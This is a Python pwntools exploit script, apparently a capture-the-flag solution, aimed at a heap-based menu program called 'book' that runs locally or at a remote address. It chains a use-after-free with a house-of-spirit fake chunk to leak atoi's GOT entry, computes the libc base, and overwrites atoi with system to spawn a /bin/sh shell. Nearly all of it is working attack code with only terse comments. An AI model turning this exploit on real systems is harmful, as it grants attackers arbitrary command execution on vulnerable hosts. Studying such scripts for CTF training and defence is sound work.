#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 0
local = 1
debug = 0

if local:
    p = process('./book')
else:
    p = remote('172.17.205.231', 10002)

if local and debug:
    gdb.attach(p, open('debug'))

elf = ELF('./book')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

atoi_got = elf.got['atoi']

def add(author, length, feedback):
    p.recvuntil('!!\n')
    p.sendline(str(2))
    p.recvuntil('author:\n')
    p.sendline(author)
    p.recvuntil('it?\n')
    p.sendline(str(length))
    p.sendline(feedback)

def delete(index):
    p.recvuntil('!!\n')
    p.sendline(str(3))
    p.recvuntil('book?\n')
    p.sendline(str(index))


def feedback(index, feedback):
    p.recvuntil('!!\n')
    p.sendline(str(4))
    p.recvuntil('feedback?')
    p.sendline(str(index))
    p.sendline(feedback)

def pwn():
# use UAF to exploit house_of_spirit 
# UAF
    add(str(0), 0x30, 'a')
    delete(0)
    add(str(1), 0x20, 'b')
    delete(0)
    add(str(2), 0x10, 'c')
    delete(0)
    add(str(3), 0x20, 'd')  # index 0
    payload = 'a' * 0x20 + p64(0) + p64(0x21) + p64(0x601d58 - 0x10)
    feedback(0, payload)
    add(str(4), 0x10, 'e')  # index 2
#    gdb.attach(p)
    add(str(5), 0x10, 'f' * 0x8 + p64(atoi_got)) # index 1

# leak atoi_addr
    p.recvuntil('!!\n')
    p.sendline('4')
    p.recvuntil('is ')
    atoi_addr = u64(p.recv(6) + '\x00\x00')
#    gdb.attach(p)
    p.recvline()
    print 'atoi_addr => ', hex(atoi_addr)

# edit atoi to system
    libc.address = atoi_addr - libc.symbols['atoi']
    system_addr = libc.symbols['system']
    print 'system_addr => ', hex(system_addr)
    p.sendline('0')
    p.sendline(p64(system_addr))
#    gdb.attach(p)

# getshell
    p.recvuntil('!!\n')
    p.send('/bin/sh\x00')
    p.interactive()

if __name__ == '__main__':
    pwn()
